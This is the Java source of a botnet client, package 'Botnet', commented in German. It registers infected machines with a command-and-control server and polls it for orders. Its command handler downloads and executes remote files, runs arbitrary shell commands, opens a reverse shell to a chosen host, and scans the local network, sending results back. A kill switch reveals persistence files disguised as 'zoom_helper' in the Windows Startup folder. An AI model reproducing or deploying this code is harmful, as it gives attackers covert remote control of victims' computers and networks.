package Botnet;


import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.rmi.ServerException;
import java.security.NoSuchAlgorithmException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;
/**
 * Diese Klasse erm�glicht den Austausch zwischen Server und Client. 
 * @author Cedric Busacker
 *
 */
public class Client { 
	private String IP;
	private static String Server;
	private static Host localhost;
	private static Socket socket;
	private final static ServerException serverException = new ServerException("Server didn't respond adequate!");
	/**
	 * Dieser Konstruktor ben�tigt lediglich einen String der f�r die Adresse des Server. Dieser String kann ein Domainname sein oder eine IP.
	 * @param Server Der Kontroll-Server f�r das Botnetz
	 * @throws Exception	Falls ein Fehler bei der �bertragung auftritt
	 */
	public Client(String server) throws Exception {	
			localhost = getLocalhost();
			IP = localhost.getIPv6(); 
			if (IP==null) {
				IP = localhost.getIPv4();
			}
			socket = new Socket();
			Client.Server = server;

	}
	/**
	 * Dieser Konstruktor akzeptiert neben dem String f�r die Spezifikation des Servers auch noch einen zuvor definierteten Host um Resourcen zu sparen.
	 * @param Server	Adresse des Kontroll-Servers
	 * @param localhost	Host des lokalen Clients
	 * @throws Exception	Falls ein Fehler bei der �bertragung auftritt.
	 */
	public Client(String server, Host localhost) throws Exception {	
		setLocalhost(localhost);
		localhost = getLocalhost();
		IP = localhost.getIPv6(); 
		if (IP==null) {
			IP = localhost.getIPv4();
		}
		socket = new Socket();
		Client.Server = server;
}
 
	/**
	 * Diese Methode wird dazu verwendet dem Server den lokalen Host in Form eines Strings zu �bermitteln.
	 * @throws Exception Falls der Server nicht zur Verf�gung steht.
	 */
    public void FirstConnect() throws Exception {
        socket = new Socket(Server, 80); 
        DataOutputStream out_stream = new DataOutputStream(socket.getOutputStream());
        DataInputStream in_stream = new DataInputStream(socket.getInputStream());
        
        Crypter crypter = new Crypter();   
        String msg = crypter.PublicKeyToString(); // Der lokale �ffentliche Schl�ssel wird zur Identifikation genutzt.
        
        out_stream.write(23); // Fordert Modus 23 (firstConnect) an.
        if (in_stream.read()!=23) {
			throw serverException;
		}
        out_stream.writeUTF(msg); // �bermittelt den �ffentlichen Schl�ssel zur Identifikation.
        out_stream.writeUTF(localhost.toString()); // Wandelt den lokalen Host in einen String um und sendet diesen an den Server.
        
        if (in_stream.readByte()==-1) { // -1 l�sst den Client wissen, dass die Verbindung erfolgreich verlaufen ist.
			out_stream.close();
			in_stream.close();
			socket.close();
			
			return;
		}
        else {
        	
			throw serverException;
		}
        
    }
    
    /**
     * Diese Methode wird genutzt um neue Befehle vom Server zu empfangen.
     * @throws Exception Falls ein Fehler bei der �bertragung auftritt.
     */
	public void GetUpdate() throws Exception {
		socket = new Socket(Server, 80);
		DataOutputStream out_stream = new DataOutputStream(socket.getOutputStream());
        DataInputStream in_stream = new DataInputStream(socket.getInputStream());
        out_stream.write(45); // Fordert Modus 45 (ClientUpdate) an.
        Crypter crypter = new Crypter();   
        String PubKey = crypter.PublicKeyToString();
        out_stream.writeUTF(PubKey); // �bermittelt den �ffentlichen Schl�ssel zur Identifikation.
        switch (in_stream.readByte()) { // Der Server sendet dann einen Modus zur�ck welcher einen Befehl wiederspiegelt.
		case 40: // Downloaded eine Datei von einer Webadresse und speichert die dort liegende Datei unter einem angegebenen Pfad ab.
			URL website = new URL(in_stream.readUTF());
			ReadableByteChannel rbc = Channels.newChannel(website.openStream());
			String path = in_stream.readUTF();
			FileOutputStream fos = new FileOutputStream(path);
			fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
			break;
		case 41: // Downloaded eine Datei von einer Webadresse und f�hrt diese aus.
			URL website1 = new URL(in_stream.readUTF());
			ReadableByteChannel rbc1 = Channels.newChannel(website1.openStream());
			String path1 = localhost.getOPERATING_PATH()+"/"+in_stream.readUTF();
			FileOutputStream fos1 = new FileOutputStream(path1);
			fos1.getChannel().transferFrom(rbc1, 0, Long.MAX_VALUE);
			new ProcessBuilder(path1).start();
			break;
		case 42: // F�hrt einen �bermittelten CMD Befehl aus.
			String cmd = in_stream.readUTF();
			new ProcessBuilder(cmd).redirectErrorStream(true).start();
			break;
		case 43: // Empf�ngt einen Server-Adresse und einem Port um zu diesem Server zu verbinden und eine Reverse-Shell zu �ffnen
			String reverseServer = in_stream.readUTF();
			if (reverseServer=="normal") {
				reverseServer=Server;
			}
			int reversePort = in_stream.readInt();
			reverseShell(reverseServer, reversePort);
		case 50: // Ruft den KillSwitch auf.
			killSwitch();
			break;
		case 20: // Modus 20 l�sst den Client keinen Befehl ausf�hren.
			break;
		case 30: // �bermittelt wie beim FirstConnect() den �ffentlichen Schl�ssel sowie alle Informationen �ber den Client.
			Thread.sleep(TimeUnit.SECONDS.toMillis(1));
			out_stream.writeUTF(PubKey);
			out_stream.writeUTF(localhost.toString());
			break;
		case 31: // Ruft einen PortScan f�r das lokale Netzwerk auf.
			scanNetwork(in_stream,out_stream);
			break;
		case 32: // �bermittelt die lokalen Informationen des Clients und ruft einen PortScan f�r das lokale Netzwerk auf.
			out_stream.writeUTF(localhost.toString());
			scanNetwork(in_stream,out_stream);
			break;
		case 33: // Ruft die Methode zum �bermitteln der aufgetretenen Fehler auf.
			sendErrors(in_stream,out_stream);
			break;
		case 34: // Definiert einen neuen Server.
			Server=in_stream.readUTF();
			break;
		case -1:
			break;
		default:
			break;
		}
        
		
	}
	/**
	 * Diese Methode liest alle aufgetretenen Fehler aus einer LogDatei und �bermittelt diese an den Server.
	 * @param in_stream
	 * @param out_stream
	 * @throws IOException
	 */
	private static void sendErrors(DataInputStream in_stream, DataOutputStream out_stream) throws IOException {
		List<String> lines = Files.readAllLines(new File("C:/Users/Public/errorService.log").toPath());
		out_stream.writeInt(lines.size());
		for (String string : lines) {
			out_stream.writeUTF(string);
		}
		
	}
	/**
	 * Diese Methode f�hrt einen PortScan f�r das gesamte lokale Netzwerk durch und �bermittelt das Ergebnis an den Server.
	 * @param in_stream
	 * @param out_stream
	 * @throws InterruptedException
	 * @throws IOException
	 */
	private static void scanNetwork(DataInputStream in_stream, DataOutputStream out_stream) throws InterruptedException, IOException {
		Runnable ScanRunner = new Runnable() { // Startet einen neunen Thread f�r das Scannen aller Ports da dies eine gewisse Zeit ben�tigt.
		    @SuppressWarnings("unused")
			public void run() {
		    	PortScanner ps = new PortScanner(localhost);
				ArrayList<ArrayList<String>> str;
				try {
					str = ps.checkLocalNetwork(localhost.getIPv4());
					socket = new Socket(Server, 80);
					DataOutputStream out_stream = new DataOutputStream(socket.getOutputStream());
			        DataInputStream in_stream = new DataInputStream(socket.getInputStream());
			        out_stream.write(31); // Fordert Modus 23(PortScan) an.
			        Crypter crypter = new Crypter();   
			        String msg = crypter.PublicKeyToString();
			        out_stream.writeUTF(msg);
			        out_stream.writeInt(str.size()); // �bermittelt die Anzahl der Zeilen.
					for (int i = 0; i < str.size(); i++) {
						out_stream.writeUTF(str.get(i).toString()); // �bermittelt eine Zeile nach der anderen.
					}
				} catch (InterruptedException | NoSuchAlgorithmException | InvalidKeySpecException | IOException e) {
				}

		    }
		};
		new Thread(ScanRunner).start();
		
		
	}
	/**
	 * Macht alle Eintr�ge von Persistance r�ckg�ngig und stoppt das Programm. Somit wird der Bot nicht mehr von selbst starten.
	 */
	private static void killSwitch() {
		String username = localhost.getUSER_NAME();
		String Autostart = "C:/Users/"+ username +"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
		String Office = "C:/Users/" + username + "/AppData/Roaming/Microsoft/Windows/Office";
		new File(Autostart, "zoom_helper.bat").delete();
		new File(Office, "zoom_helper.jar").delete();
		System.exit(0);
	}
	/**
	 * �ffnent eine Reverse-Shell zum Server angebenen Server mit dem angebenen Port.
	 * @param server
	 * @param port
	 * @throws IOException
	 * @throws InterruptedException
	 */
	private static void reverseShell(String server, int port) throws IOException, InterruptedException {
		String cmd = "";
		if (localhost.getOS_NAME().toLowerCase().contains("win")) {
	    	cmd = "cmd.exe";
		}else {
			cmd = "/bin/sh";
		}
		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
	    Socket s=new Socket(server,port);
	    InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
	    OutputStream po=p.getOutputStream(),so=s.getOutputStream();
	    while(!s.isClosed()) {
	      while(pi.available()>0)
	        so.write(pi.read());
	      while(pe.available()>0)
	        so.write(pe.read());
	      while(si.available()>0)
	        po.write(si.read());
	      so.flush();
	      po.flush();
	      Thread.sleep(50);
	      try {
	        p.exitValue();
	        break;
	      }
	      catch (Exception e){
	      }
	    };
	    p.destroy();
	    s.close();
		
	}

	// Getters und Setters

	public static Host getLocalhost() throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
		if (localhost==null) {
			localhost = new Host(true);
		}
		return localhost;
	}



	public static void setLocalhost(Host localhost) {
		Client.localhost = localhost;
	}
    
}